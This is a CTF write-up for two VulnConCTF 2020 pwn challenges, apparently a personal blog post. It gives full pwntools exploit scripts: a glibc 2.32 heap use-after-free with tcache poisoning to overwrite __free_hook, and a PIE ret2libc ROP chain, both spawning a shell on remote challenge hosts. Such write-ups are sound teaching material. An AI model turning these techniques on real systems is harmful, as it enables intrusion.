# VulnConCTF 2020

I did some pwn for fun on Friday evening :^)


## the good old time
This is a very generic heap challenge, on glibc 2.32.

We can add, edit, show, and delete.

Deleting does not null out the pointer in the array, and showing just calls puts() on the chunk.


To leak libc, we can free a chunk into unsorted bin. However the fwd and bk ended in a 0x00 so I added another chunk that was bigger to get the first chunk into the smallbin. Then, I just showed the chunk to leak libc.


To write to free hook, we can simply tcache poison. In glibc 2.32, tcache pointer mangling was introduced, meaning we have to do a bit more than just edit the fwd of a free chunk in tcache. I googled a bit and found a script that can both encode and decode mangled pointers. Very cool.

```python
from pwn import *

e = ELF("./thegoodoldtime")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.32.so")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([e.path])
p = remote("35.246.22.179", 49155)

context.log_level="debug"
gdb.attach(p, """c""")


def new(idx, size, data):
    p.sendlineafter("exit\n", "1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    p.sendlineafter(":", data)

def edit(idx, data):
    p.sendlineafter("exit\n", "2")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", data)

def show(idx):
    p.sendlineafter("exit\n", "3")
    p.sendlineafter(":", str(idx))
    
    
def delete(idx):
    p.sendlineafter("exit\n", "4")
    p.sendlineafter(":", str(idx))


# uwu https://github.com/mdulin2/mangle/blob/master/mangle.py

# Mangle the ptr
def encode_ptr(fd_ptr, storage_location, print_hex=False):
        if(print_hex):
                return hex((storage_location >> 12) ^ fd_ptr)
        return (storage_location >> 12) ^ fd_ptr


# Demangle the ptr
def decode_ptr(mangled_ptr,storage_location, print_hex=False):
        if(print_hex):
                return hex((storage_location >> 12) ^ mangled_ptr)
        return (storage_location >> 12) ^ mangled_ptr



# this thing is op
def recover_ptrs(mangled_ptr, loc_final_bits=0x0, print_hex=False):

        count = 0x0 
        tmp_value = mangled_ptr
        while(tmp_value & 0xFFFFFF000 != 0x0):
                tmp_value = tmp_value >> 4
                count +=1 

        # Get the top-most 12 bits to initialize the process
        initial = mangled_ptr & (0xFFF * (0x10 ** count))
        final_ptr = initial
        final_location = initial
        known_bits = initial >>  (count * 4) 

        for iteration in range(1, (count/3) + 1):

                exp_amount = (count - (3 * iteration))
                shift_amount = (count - (3 * iteration)) * 4

                # Get the 12 bits to the right of the top-most 12 bits of the value.
                tmp_value = mangled_ptr & (0xFFF * (0x10 ** exp_amount))

                # Shift the values over. Then, operate on them.

                ptr_shift = tmp_value >> shift_amount

                # Operate on the bits in order to get the ptr bits at the specific location.
                known_bits = ptr_shift ^ known_bits

                # Add the new known_bits to the total for the final_ptr
                new_bits = known_bits << shift_amount

                # The 'known_bits' are the location in which the ptr was stored at that we are getting.
                final_ptr = final_ptr + new_bits


        # The least significant twelve bits are unknown for the storage location. So, we remove them.
        final_location =  final_location & 0xFFFFFFFFFFFFF000

        # If the final bits of the location are given, we add them back in.
        if(loc_final_bits):
                final_location += (loc_final_bits & 0xFFF)

        if(print_hex):
                final_ptr = hex(final_ptr) 
                final_location = hex(final_location)
        return final_ptr, final_location


new(1, 0x550, "AAAA")


new(2, 0x50, "BBBB")


new(3, 0x50, "BBBB")


delete(1)



show(1)

delete(2)
delete(3)



new(4, 0x700, "CCCC")

show(1)


p.recv()
libc.address = u64((p.recv(6)).ljust(8, "\x00")) - 0x1e4040

print("libc base", hex(libc.address))




show(3)
p.recv()


mangled_fwd = u64((p.recv(6)).ljust(8, "\x00"))

print("mangled fwd", hex(mangled_fwd))

thing, _ = recover_ptrs(mangled_fwd)

tcache = thing - 0x810

print("tcache at", hex(tcache))

edit(3, p64(encode_ptr(libc.sym["__free_hook"], tcache)))


new(5, 0x50, "AAAA")
new(6, 0x50, p64(libc.sym["system"]))


new(7, 0x20, "/bin/sh")
delete(7)

p.interactive()
```


## Wheretogo

This is a classic ret2libc, but there is PIE enabled. Thankfully, there is a function that prints the address of main. We can brute force 1 nibble of ASLR by partially overwriting the return address on the stack to jump to the function. Annoyingly the binary calls write() not puts(), so we have to look around for some different gadgets to set up the registers to leak the libc. Then it is just ret2libc.

```python
from pwn import *

e = ELF("./where_to_go")

libc = ELF("./libc.so.6")

context.binary = e
context.terminal = ["konsole", "-e"]


while True:
    #p = process([e.path])
    p = remote("35.232.11.215", 49155)


    context.log_level="debug"
    #


    p.sendafter("!", "A"*40+"\x99\x48")
    
    try:
        p.recvline()
        main = u64(p.recv(6).ljust(8, "\x00"))
        break
    except EOFError:
        p.close()
        continue



pie = main-0x7da

print("main", hex(main))
print("pie base", hex(pie))

gdb.attach(p, """break * system\nc""")




p.sendafter("!", "A"*40 + p64(pie+0x943) + p64(1) + p64(pie+0x941) + p64(pie + e.got["__libc_start_main"]) + p64(0) + p64(pie+e.plt["write"]) + p64(main))

p.recvline()

libc.address = u64(p.recv(6).ljust(8, "\x00")) - 0x21b10

print("libc base", hex(libc.address))



p.sendafter("!", "A"*40 + p64(pie+0x943) + p64(next(libc.search("/bin/sh"))) + p64(pie+0x666) + p64(libc.sym["system"]))



p.interactive()
```
